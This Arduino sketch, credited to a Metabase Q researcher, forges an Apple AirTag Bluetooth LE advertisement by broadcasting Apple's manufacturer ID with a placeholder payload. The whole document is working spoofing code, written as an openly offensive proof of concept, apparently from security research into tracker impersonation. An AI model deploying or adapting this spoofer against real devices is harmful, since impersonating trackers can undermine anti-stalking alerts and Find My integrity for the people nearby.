#include <ArduinoBLE.h>

/*
  Salvador Mendoza - Metabase Q
  
  Spoof Apple AirTag advertising package
  Aug 10th, 2022
*/

uint8_t advertisement[31] = { //Data to be advertise
  0x1E, 0xFF, 0x4C, 0x00, 0x12, 0x19, 0x10, 0x12, 0x12, 0x34, 0x56, 
  0x78, 0x12, 0x34, 0x56, 0x78, 0x90, 0x12, 0x34, 0x56, 0x78, 0x90, 
  0x12, 0x34, 0x56, 0x78, 0x90, 0x12, 0x34, 0x56, 0x90
  };                        


void setup() {
  Serial.begin(9600);
  while (!Serial);
  
  // Begin initialization
  if (!BLE.begin()) {
    Serial.println("starting BLE failed!");
    while (1);
  }

  Serial.println("BLE Central scan");

  // Start scanning for peripheral
  BLE.scan();
}

void spoofDevice(){ //Spoof advertising data
  uint8_t adv[27];
  for (int x = 4; x < 31; x++) {
    adv[x-4] = (byte)advertisement[x];
  }

  uint16_t idm = 0x004c; //Apple ID
  //setAdvertisingData(BLEAdvertisingData& advertisingData)

  BLE.setManufacturerData(idm, adv, sizeof(adv));
  BLE.advertise();
  
  while (1){}
}

void loop(){
  spoofDevice();
}
